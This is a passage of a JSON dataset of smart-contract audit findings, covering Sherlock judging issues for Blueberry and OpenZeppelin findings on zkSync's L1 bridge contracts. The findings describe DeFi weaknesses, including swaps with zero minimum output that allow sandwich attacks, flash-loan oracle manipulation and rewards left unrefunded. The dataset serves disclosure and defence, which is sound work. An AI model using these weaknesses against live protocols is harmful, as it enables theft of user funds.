amount,\n                lpDecimals\n            );\n        }\n\naccExtPerShare stores the current rewardPerToken when the position is first created. It stores it as an array and only stores values for reward tokens that have been added prior to minting. This creates an issue if a reward token is added because now it will attempt to pull a value for an index that doesn't exist and throw an OOB error.\n\nThis is problematic because pendingRewards is called every single transaction via the isLiquidatable subcall in BlueBerryBank#execute.\n\n## Impact\n\nWAuraPools will irreversibly break if reward tokens are added to pool after\n\n## Code Snippet\n\n[WAuraPools.sol#L152-L190](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WAuraPools.sol#L152-L190)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse a mapping rather than an array to store values",
      "summary": "\nThis bug report is about the WAuraPools smart contract. It was found by 0x52 and Ch_301 and is related to the issue of adding reward tokens to a pool after a deposit. This results in an Out of Bounds (OOB) error on the accExtPerShare variable, which is an array that stores the current reward per token when the position is first created. This OOB error occurs because the array only stores values for reward tokens that were added prior to minting, and so if a reward token is added after, it will attempt to pull a value for an index that doesn't exist. This is problematic because pendingRewards is called every single transaction via the isLiquidatable subcall in BlueBerryBank#execute. As a result, WAuraPools will irreversibly break if reward tokens are added to the pool after a deposit. The code snippet associated with this issue is found in the WAuraPools.sol file from line 152 to line 190. The tool used to find this bug was manual review. The recommendation to solve this issue is to use a mapping rather than an array to store values.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/127",
      "tags": [
        "Missing-Logic",
        "Mapping",
        "Coding-Bug",
        "Array Bound"
      ],
      "finders": [
        "Ch\\_301",
        "0x52"
      ]
    },
    {
      "id": "18486",
      "title": "H-6: ShortLongSpell#_withdraw checks slippage limit but never applies it making it useless",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/126 \n\n## Found by \n0x52, Ch\\_301\n## Summary\n\nSlippage limits protect the protocol in the event that a malicious user wants to extract value via swaps, this is an important protection in the event that a user finds a way to trick collateral requirements. Currently the sell slippage is checked but never applied so it is useless.\n\n## Vulnerability Detail\n\nSee summary.\n\n## Impact\n\nSlippage limit protections are ineffective for ShortLongSpell\n\n## Code Snippet\n\n[ShortLongSpell.sol#L160-L20](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ShortLongSpell.sol#L160-L202)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nApply sell slippage after it is checked\n\n\n\n## Discussion\n\n**securitygrid**\n\nEscalate for 10 USDC\nThis is not a valid M/H. The toAmont and expectedAmount in the off-chain parameter [MegaSwapSellData](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/libraries/Paraswap/Utils.sol#L30-L42) structure are the real slippage protection parameters. Just like ExactInputParams/ExactOutputParams of uniswapV3 pool.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> This is not a valid M/H. The toAmont and expectedAmount in the off-chain parameter [MegaSwapSellData](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/libraries/Paraswap/Utils.sol#L30-L42) structure are the real slippage protection parameters. Just like ExactInputParams/ExactOutputParams of uniswapV3 pool.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nI still think this is a valid issue\n\nsellSlippage checked but not applied\n\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/96eb1829571dc46e1a387985bd56989702c5e1dc/blueberry-core/contracts/spell/ShortLongSpell.sol#L160-L202\n\n```solidity\n   function _withdraw(\n        ClosePosParam calldata param,\n        Utils.MegaSwapSellData calldata swapData\n    ) internal {\n        if (param.sellSlippage > bank.config().maxSlippageOfClose())\n            revert Errors.RATIO_TOO_HIGH(param.sellSlippage);\n```\n\nit is true that the slippage is checked but not applied\n\n> The toAmont and expectedAmount in the off-chain parameter [MegaSwapSellData](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/libraries/Paraswap/Utils.sol#L30-L42) structure are the real slippage protection parameters. Just like ExactInputParams/ExactOutputParams of uniswapV3 pool.\n\nthis is true, but the code should still check the slippage based on the received amount instead of off-chain parameter\n\n\n\n**hrishibhat**\n\nEscalation rejected\n\nValid high\nAgree with the Lead judge comment. \nSlippage must be checked on code whenever possible instead of an off-chain parameter. \n\n\n**sherlock-admin**\n\n> Escalation rejected\n> \n> Valid high\n> Agree with the Lead judge comment. \n> Slippage must be checked on code whenever possible instead of an off-chain parameter. \n> \n\n    This issue's escalations have been rejected!\n\n    Watsons who escalated this issue will have their escalation amount deducted from their next payout.",
      "summary": "\nA bug has been identified in the ShortLongSpell protocol, where the sell slippage is checked but never applied, making it useless. This is an important protection in the event that a user finds a way to trick collateral requirements. The code snippet that is affected can be found at ShortLongSpell.sol#L160-L202. The bug was discovered by 0x52 and Ch\\_301.\n\nThe impact of this bug is that slippage limit protections are ineffective for ShortLongSpell. The recommendation is to apply sell slippage after it is checked.\n\nThe bug was discussed by securitygrid, sherlock-admin, ctf-sec, and hrishibhat. Securitygrid pointed out that the toAmont and expectedAmount in the off-chain parameter MegaSwapSellData structure are the real slippage protection parameters, and that this is similar to the ExactInputParams/ExactOutputParams of uniswapV3 pool. Ctf-sec argued that the code should still check the slippage based on the received amount instead of off-chain parameter. Hrishibhat then rejected the escalation, saying that slippage must be checked on code whenever possible instead of an off-chain parameter. Sherlock-admin then confirmed that the escalations had been rejected and that Watsons who escalated the issue will have their escalation amount deducted from their next payout.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/126",
      "tags": [
        "Slippage",
        "Configuration",
        "Coding-Bug"
      ],
      "finders": [
        "Ch\\_301",
        "0x52"
      ]
    },
    {
      "id": "18485",
      "title": "H-5: ConvexSpell#closePositionFarm removes liquidity without any slippage protection",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/124 \n\n## Found by \n0x52, Breeje, Ch\\_301, n1punp\n## Summary\n\nConvexSpell#closePositionFarm removes liquidity without any slippage protection allowing withdraws to be sandwiched and stolen. Curve liquidity has historically been strong but for smaller pairs their liquidity is getting low enough that it can be manipulated via flashloans. \n\n## Vulnerability Detail\n\n[ConvexSpell.sol#L204-L208](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ConvexSpell.sol#L204-L208)\n\n            ICurvePool(pool).remove_liquidity_one_coin(\n                amountPosRemove,\n                int128(tokenIndex),\n                0\n            );\n\nLiquidity is removed as a single token which makes it vulnerable to sandwich attacks but no slippage protection is implemented. The same issue applies to CurveSpell.\n\n## Impact\n\nUser withdrawals can be sandwiched\n\n## Code Snippet\n\n[ConvexSpell.sol#L147-L230](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ConvexSpell.sol#L147-L230)\n\n[CurveSpell.sol#L143-L223](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/CurveSpell.sol#L143-L223)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAllow user to specify min out",
      "summary": "\nThis bug report is about the ConvexSpell and CurveSpell smart contracts, which are used to remove liquidity from Curve pools. The issue is that these smart contracts remove liquidity without any slippage protection, which makes them vulnerable to sandwich attacks. This means that user withdrawals can be sandwiched and stolen. The code snippets which are vulnerable to this attack are ConvexSpell.sol#L147-L230 and CurveSpell.sol#L143-L223. The bug was found by 0x52, Breeje, Ch_301, and n1punp. The recommended solution is to allow users to specify a minimum out.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/124",
      "tags": [
        "Slippage",
        "Sandwich Attack",
        "Flash Loan"
      ],
      "finders": [
        "Ch\\_301",
        "0x52",
        "Breeje",
        "n1punp"
      ]
    },
    {
      "id": "18484",
      "title": "H-4: Potential flash loan attack vulnerability in `getPrice` function of CurveOracle",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/123 \n\n## Found by \nBauer, helpMePlease\n## Summary\nDuring a security review of the `getPrice` function in the CurveOracle, a potential flash loan attack vulnerability was identified.\n\n## Vulnerability Detail\nThe `getPrice` function retrieves the spot price of each token in a Curve LP pool, calculates the minimum price among them, and multiplies it by the virtual price of the LP token to determine the USD value of the LP token. If the price of one or more tokens in the pool is manipulated, this can cause the minimum price calculation to be skewed, leading to an incorrect USD value for the LP token. This can be exploited by attackers to make a profit at the expense of other users.\n\n## Impact\nThis vulnerability could potentially allow attackers to manipulate the price of tokens in Curve LP pools and profit at the expense of other users. If exploited, this vulnerability could result in significant financial losses for affected users.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/96eb1829571dc46e1a387985bd56989702c5e1dc/blueberry-core/contracts/oracle/CurveOracle.sol#L122\n\n## Tool used\n\nManual Review\n\n## Recommendation\nuse TWAP to determine the prices of the underlying assets in the pool.",
      "summary": "\nA security review of the `getPrice` function in the CurveOracle revealed a potential flash loan attack vulnerability. The `getPrice` function retrieves the spot price of each token in a Curve LP pool, calculates the minimum price among them, and multiplies it by the virtual price of the LP token to determine the USD value of the LP token. If the price of one or more tokens in the pool is manipulated, this can cause the minimum price calculation to be skewed, leading to an incorrect USD value for the LP token. This can be exploited by attackers to make a profit at the expense of other users. If exploited, this vulnerability could result in significant financial losses for affected users. The code snippet for this vulnerability can be found at  https://github.com/sherlock-audit/2023-04-blueberry/blob/96eb1829571dc46e1a387985bd56989702c5e1dc/blueberry-core/contracts/oracle/CurveOracle.sol#L122. The security review was conducted manually. The recommendation to mitigate this vulnerability is to use TWAP (Time-Weighted Average Price) to determine the prices of the underlying assets in the pool.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/123",
      "tags": [
        "Oracle",
        "Lending Pool",
        "Flash Loan"
      ],
      "finders": [
        "Bauer",
        "helpMePlease"
      ]
    },
    {
      "id": "18483",
      "title": "H-3: Users are forced to swap all reward tokens with no slippage protection",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/121 \n\n## Found by \n0x52, Bauer, Breeje, J4de, ctf\\_sec, n1punp, nobody2018\n## Summary\n\nAuraSpell forces users to swap their reward tokens to debt token but doesn't allow them to specify any slippage values.\n\n## Vulnerability Detail\n\n[AuraSpell.sol#L193-L203\n](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L193-L203)\n\n        for (uint256 i = 0; i < rewardTokens.length; i++) {\n            uint256 rewards = _doCutRewardsFee(rewardTokens[i]);\n            _ensureApprove(rewardTokens[i], address(swapRouter), rewards);\n            swapRouter.swapExactTokensForTokens(\n                rewards,\n                0,\n                swapPath[i],\n                address(this),\n                type(uint256).max\n            );\n        }\n\nAbove all reward tokens are swapped and always use 0 for min out meaning that deposits will be sandwiched and stolen.\n\n## Impact\n\nAll reward tokens can be sandwiched and stolen\n\n## Code Snippet\n\n[AuraSpell.sol#L149-L224](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L149-L224)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAllow user to specify slippage parameters for all reward tokens",
      "summary": "\nThis bug report is about an issue found in the AuraSpell.sol contract, which is part of the Sherlock Audit project. The issue is that users are forced to swap all reward tokens with no slippage protection. This was found through manual review by 0x52, Bauer, Breeje, J4de, ctf_sec, n1punp, and nobody2018.\n\nThe vulnerability detail is that the code snippet for the swap function does not allow users to specify any slippage values, meaning that deposits can be sandwiched and stolen. This can result in all reward tokens being sandwiched and stolen. The code snippet for the vulnerability can be found in AuraSpell.sol#L193-L203 and the full code snippet can be found in AuraSpell.sol#L149-L224.\n\nThe impact of this vulnerability is that all reward tokens can be sandwiched and stolen. The recommendation for this issue is to allow users to specify slippage parameters for all reward tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/121",
      "tags": [
        "Slippage",
        "Deposit/Reward tokens"
      ],
      "finders": [
        "Bauer",
        "0x52",
        "J4de",
        "n1punp",
        "nobody2018",
        "Breeje",
        "ctf\\_sec"
      ]
    },
    {
      "id": "18482",
      "title": "H-2: AuraSpell#openPositionFarm uses incorrect join type for balancer",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/120 \n\n## Found by \n0x52, cuthalion0x\n## Summary\n\nThe JoinPoolRequest uses \"\" for userData meaning that it will decode into 0. This is problematic because join requests of type 0 are \"init\" type joins and will revert for pools that are already initialized. \n\n## Vulnerability Detail\n\nhttps://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F24#L49\n\n    enum JoinKind { INIT, EXACT_TOKENS_IN_FOR_BPT_OUT, TOKEN_IN_FOR_EXACT_BPT_OUT }\n\nWe see above that enum JoinKind is INIT for 0 values.\n\nhttps://etherscan.io/address/0x5c6ee304399dbdb9c8ef030ab642b10820db8f56#code#F24#L290\n\n            return _joinExactTokensInForBPTOut(balances, normalizedWeights, userData);\n        } else if (kind == JoinKind.TOKEN_IN_FOR_EXACT_BPT_OUT) {\n            return _joinTokenInForExactBPTOut(balances, normalizedWeights, userData);\n        } else {\n            _revert(Errors.UNHANDLED_JOIN_KIND);\n        }\n\nHere user data is decoded into join type and since it is \"\" it will decode to type 0 which will result in a revert.\n\n## Impact\n\nUsers will be unable to open any farm position on AuraSpell\n\n## Code Snippet\n\n[AuraSpell.sol#L63-L147](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/AuraSpell.sol#L63-L147)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUses JoinKind = 1 for user data",
      "summary": "\nThis bug report is about an issue found in the AuraSpell#openPositionFarm function in the Sherlock Audit 2023-04-blueberry-judging repository. The issue is that the JoinPoolRequest uses \"\" for userData, which will decode into 0, resulting in a join request of type 0, which is an \"init\" type join and will revert for pools that are already initialized. This issue was found by 0x52 and cuthalion0x and confirmed by manual review. The impact of this issue is that users will be unable to open any farm position on AuraSpell. The code snippet for this issue can be found in the AuraSpell.sol#L63-L147. The recommendation is to use JoinKind = 1 for user data.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/120",
      "tags": [
        "Configuration",
        "Coding-Bug"
      ],
      "finders": [
        "0x52",
        "cuthalion0x"
      ]
    },
    {
      "id": "18481",
      "title": "H-1: attackers will keep stealing the `rewards` from Convex SPELL",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/101 \n\n## Found by \nBauer, Ch\\_301\n## Summary\nOn [WConvexPools.burn()](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WConvexPools.sol#L201-L235) transfer [CRV + CVX + the extra rewards](https://docs.convexfinance.com/convexfinance/general-information/why-convex/convex-for-liquidity-providers) to Convex SPELL \n\n\n## Vulnerability Detail\nBut [ConvexSpell.openPositionFarm()](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ConvexSpell.sol#L67-L138) only refund CVX to the user.\nSo the rest rewards will stay in the SPELL intel if someone (could be an attacker) invokes `_doRefund()` within `closePositionFarm()` with the same address tokens \n\n## Impact\n- Convex SPELL steals the user rewards \n- the protocol will lose some fees \n- attackers will keep stealing the rewards from Convex SPELL\n\n## Code Snippet\n`WConvexPools.burn()` transfer CRV + CVX + the extra rewards\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WConvexPools.sol#L201-L235\n```solidity\n        // Transfer LP Tokens\n        IERC20Upgradeable(lpToken).safeTransfer(msg.sender, amount);\n\n        // Transfer Reward Tokens\n        (rewardTokens, rewards) = pendingRewards(id, amount);\n\n        for (uint i = 0; i < rewardTokens.length; i++) {\n            IERC20Upgradeable(rewardTokens[i]).safeTransfer(\n                msg.sender,\n                rewards[i]\n            );\n        }\n```\n\nonly refund CVX to the user\nhttps://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/spell/ConvexSpell.sol#LL127C1-L138C10\n```solidity\n        // 6. Take out existing collateral and burn\n        IBank.Position memory pos = bank.getCurrentPositionInfo();\n        if (pos.collateralSize > 0) {\n            (uint256 pid, ) = wConvexPools.decodeId(pos.collId);\n            if (param.farmingPoolId != pid)\n                revert Errors.INCORRECT_PID(param.farmingPoolId);\n            if (pos.collToken != address(wConvexPools))\n                revert Errors.INCORRECT_COLTOKEN(pos.collToken);\n            bank.takeCollateral(pos.collateralSize);\n            wConvexPools.burn(pos.collId, pos.collateralSize);\n            _doRefundRewards(CVX);\n        }\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\nyou should Refund all Rewards (CRV + CVX + the extra rewards)\n\n\n\n## Discussion\n\n**Ch-301**\n\nEscalate for 10 USDC\n\nConvex docs are confirming this point \n\n```diff\nConvex allows liquidity providers to earn trading fees and claim boosted CRV without locking CRV themselves. Liquidity providers can receive boosted CRV and liquidity mining rewards with minimal effort:\nEarn claimable CRV with a high boost without locking any CRV\nEarn CVX rewards\nZero deposit and withdraw fees\nZero fees on extra incentive tokens (SNX, etc)\n```\nand [WConvexPools.burn()](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WConvexPools.sol#L201-L235) handle this properly\n\nso Convex SPELL should refund all the rewards\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> Convex docs are confirming this point \n> \n> ```diff\n> Convex allows liquidity providers to earn trading fees and claim boosted CRV without locking CRV themselves. Liquidity providers can receive boosted CRV and liquidity mining rewards with minimal effort:\n> Earn claimable CRV with a high boost without locking any CRV\n> Earn CVX rewards\n> Zero deposit and withdraw fees\n> Zero fees on extra incentive tokens (SNX, etc)\n> ```\n> and [WConvexPools.burn()](https://github.com/sherlock-audit/2023-04-blueberry/blob/main/blueberry-core/contracts/wrapper/WConvexPools.sol#L201-L235) handle this properly\n> \n> so Convex SPELL should refund all the rewards\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nSenior watson's comment:\n\nsame as\nhttps://github.com/sherlock-audit/2023-05-blueberry-judging/issues/29 \n\n**hrishibhat**\n\nEscalation accepted\n\nValid high \nThis issue is a valid high along with another duplicate #42\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Valid high \n> This issue is a valid high along with another duplicate #42\n\n    This issue's escalations have been accepted!\n\n    Contestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue found in the Convex SPELL code. The code allows users to transfer CRV, CVX, and extra rewards to the SPELL, but only refunds CVX to the user when the position is closed. This means that the extra rewards remain in the SPELL, and can be stolen by attackers if they invoke the same address tokens with the _doRefund() function. This vulnerability can cause the Convex SPELL to steal user rewards, leading to the protocol losing fees, and attackers being able to keep stealing rewards from the SPELL. The code snippet provided in the report shows the WConvexPools.burn() function, which transfers CRV, CVX, and extra rewards, and the ConvexSpell.openPositionFarm() function, which only refunds CVX to the user. The tool used to identify this bug was manual review. The recommendation is to refund all rewards (CRV + CVX + the extra rewards). The discussion that followed included a comment from Ch-301, who suggested escalating the bug for 10 USDC, and Convex docs to confirm the point. Senior Watson's comment pointed to a duplicate issue, and Hrishibhat accepted the escalation. Finally, Sherlock-Admin confirmed that the issue's escalation had been accepted, and that contestants' payouts and scores would be updated accordingly.",
      "quality_score": 1,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-blueberry-judging/issues/101",
      "tags": [
        "Coding-Bug",
        "Business Logic",
        "Deposit/Reward tokens"
      ],
      "finders": [
        "Bauer",
        "Ch\\_301"
      ]
    },
    {
      "id": "10319",
      "title": "Cross-chain system contract invocation is allowed and undocumented",
      "impact": "LOW",
      "content": "System contract addresses can be specified in [`requestL2Transaction`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L232). However, this can cause potential unexpected side effects when executing the transactions on L2 since system contracts are documented to not be intended for direct invocation by users.\n\n\nFor example, if the destination address is set to the system `ContractDeployer`, it appears that the bootloader [will execute it in `isSystem` mode](https://github.com/matter-labs/system-contracts/blob/a7b5968f5e7267073fcfb90b841963e3c7705bf6/bootloader/bootloader.yul#L1421). This code path is used for the deployment of the ERC-20 bridge in [`L1ERC20Bridge.initialize`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/bridge/L1ERC20Bridge.sol#L138-L146).\n\n\nIt is possible that allowing this invocation path from L1 may introduce vulnerabilities and side effects, depending on each specific system contract’s access control. This is because L1 and L2 invocation paths in the bootloader are treated differently and may encode different assumptions which may be violated in one path but not in the other. If calling most system contracts is not an expected usage pattern, allowing the users to make these cross-chain calls creates an unnecessary attack surface area.\n\n\nConsider restricting the addresses allowed to be called from L1. This can be done by checking that the destination address doesn’t fall into the system contracts’ address space. Additionally, consider documenting these usage patterns.\n\n\n***Update:** Acknowledged, not resolved. The Matter Labs team stated:*\n\n\n\n> *We agree that calling system contracts can be dangerous in general. However, due to the design of L1-to-L2 transactions, we do not see any potential problems with calling system contracts. The same call may be done via L2 by directly calling the system contracts.*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync – L1 Diff Audit (February 2023)",
      "source_link": "https://blog.openzeppelin.com/zksync-l1-diff-audit-february-2023/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10318",
      "title": "Diamond proxy holding large bridged ETH balance",
      "impact": "LOW",
      "content": "In the current design, ERC-20 bridging uses a separate contract to hold token balances, but `MailboxFacet` holds and operates the ETH balance. However, since it is implemented as part of the Diamond Proxy, this means that the contract balance is common to all current and future facets of the proxy. This poses several risks:\n\n\n* It exposes the bridged and locked funds to an additional risk of exploit by introducing vulnerabilities in the other facets.\n* The locked balance is possibly co-mingled with other ETH that may be in use by the other facets.\n* By adding functionality to handle outbound ETH transfers, it introduces a site for a call to a user-defined destination out of the main proxy that can potentially be leveraged for other future attacks.\n\n\nConsidering that the ETH balance of the bridge may become very large, it may be better to design a system that reduces these risks.\n\n\nConsider handling ETH deposits and withdrawals by converting them to WETH and using the ERC-20 bridge. This will have the additional benefit of avoiding balance handling code duplication between the `MailboxFacet` and the ERC-20 bridge, and will also remove the need to make a dangerous ETH transfer call out of the contract.\n\n\n***Update:** Acknowledged, not resolved. The Matter Labs team stated:*\n\n\n\n> *Holding deposited ETH in the diamond proxy was a difficult decision, but we could not equip an efficient approach and stable fee model in a different way (users send L1 to L2 transactions and receive ETH refunds). So all ETH should be held in one contract (either `EthBridge` or diamond proxy).*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync – L1 Diff Audit (February 2023)",
      "source_link": "https://blog.openzeppelin.com/zksync-l1-diff-audit-february-2023/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10317",
      "title": "L2 transaction hash is not emitted",
      "impact": "LOW",
      "content": "The L2 transaction hash is a needed input during the L1 to L2 transaction flow on chain (in [`claimFailedDeposit`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/bridge/L1ERC20Bridge.sol#L243)), and for keeping track of L2 inclusion success off chain. However, it is not emitted in events by the callers in [`_requestDeployTransaction()`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/bridge/L1ERC20Bridge.sol#L138) or during [ERC-20 `deposit()`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/bridge/L1ERC20Bridge.sol#L179). As a consequence, off-chain infrastructure (indexers, UIs, analytics dashboards) will not be able to keep track of bridging activity as easily.\n\n\nConsider emitting the resulting transaction hash in an event after [submitting the request in the `MailboxFacet`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L232).\n\n\n***Update:** Resolved. We later found that this was not an issue because the hash was emitted in event [NewPriorityRequest](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L374) as stated by the Matter Labs team:*\n\n\n\n> *`_requestDeploy` is only used for the bridge initialization, so we do not think it may affect off-chain infrastructure (indexers, UIs, analytics dashboards). Moreover, the transaction hashes are emitted in the `Mailbox` itself.*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync – L1 Diff Audit (February 2023)",
      "source_link": "https://blog.openzeppelin.com/zksync-l1-diff-audit-february-2023/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10316",
      "title": "Revert messages are not informative",
      "impact": "LOW",
      "content": "This issue has been reported in the previous Layer 1 Diff Audit ([L01 – Missing error messages in require statements](https://blog.openzeppelin.com/zksync-layer-1-diff-audit/#missing-error-messages-in-require-statements)). Reverts are important logical components, and a lack of revert messages makes them confusing and increases the chance of missing vulnerabilities during a review.\n\n\nThe codebase as a whole has revert messages that consist of two letters and convey no information. Additionally, the two-letter combinations collide (for example “po”) for different contracts. Crucially, no resource is available to translate the codes into meaningful error messages. Although something is typically mentioned in comments next to the revert, a meaningful error message (or a custom error) is expected since comments can be outdated and cannot be tested.\n\n\nConsider using informative error messages or custom errors throughout the codebase.\n\n\n***Update:** Acknowledged, not resolved. The Matter Labs team stated:*\n\n\n\n> *We agree that custom errors will be much more understandable and convenient. At this time, we have no capacity for such a large refactoring, but we have planned it for the next milestone.*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync – L1 Diff Audit (February 2023)",
      "source_link": "https://blog.openzeppelin.com/zksync-l1-diff-audit-february-2023/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10315",
      "title": "Missing documentation",
      "impact": "LOW",
      "content": "Docstrings and inline comments are missing in several parts of the codebase with sensitive functionality. For example:\n\n\n* The entirety of [`L2ContractHelper` contract](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/common/L2ContractHelper.sol): the functionality is internal, but is complex and coupled with other interfaces (custom encoding of bytecode hashes, custom `create2` address derivation, etc).\n* [`_getMinimalPriorityTransactionGasLimit`](https://github.com/matter-labs/zksync-2-contracts/blob/3f345ce52bc378c4b5d710c80d817db170775049/ethereum/contracts/zksync/facets/Mailbox.sol#L381): it is possible that this method overestimates / underestimates, or is implemented incorrectly. However, relevant documentation was insufficient to validate this.\n\n\nConsider including thorough docstrings and inline explanations with references to relevant source files or documentation, allowing readers or maintainers to verify the implementations and their correct usage.\n\n\n***Update:** Resolved in [pull request #55](https://github.com/matter-labs/zksync-2-contracts/pull/55) at commits [41946cc](https://github.com/matter-labs/zksync-2-contracts/pull/55/commits/41946cc82a0375120c5feab6e8e2551653616a71) and [57f702d](https://github.com/matter-labs/zksync-2-contracts/pull/55/commits/57f702de081d513adf226fedddb80a5ef6acccf6).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync – L1 Diff Audit (February 2023)",
      "source_link": "https://blog.openzeppelin.com/zksync-l1-diff-audit-february-2023/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10314",
      "title": "Lack of tests",
      "impact": "MEDIUM",
